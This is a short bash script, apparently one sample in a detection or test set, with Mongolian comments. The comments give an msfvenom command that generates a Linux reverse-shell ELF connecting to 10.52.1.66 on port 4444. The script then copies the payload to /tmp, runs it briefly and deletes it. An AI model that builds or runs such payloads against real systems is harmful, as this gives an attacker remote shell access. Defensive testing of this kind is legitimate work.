#!/bin/bash
# Sample 02 — msfvenom-аар үүсгэсэн static reverse shell ELF
# Бэлдэх:
#   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.52.1.66 LPORT=4444 -f elf -o /opt/samples/02/payload.elf
#   chmod +x /opt/samples/02/payload.elf
SAMPLE_DIR="$(dirname "$0")"
PAYLOAD="$SAMPLE_DIR/payload.elf"

if [ ! -f "$PAYLOAD" ]; then
    echo "ERROR: $PAYLOAD oldsongüi. msfvenom-aar bühen."
    exit 1
fi

cp "$PAYLOAD" /tmp/sample02_$$
chmod +x /tmp/sample02_$$
timeout 5 /tmp/sample02_$$ &
sleep 3
rm -f /tmp/sample02_$$
echo "Sample 02 finished"
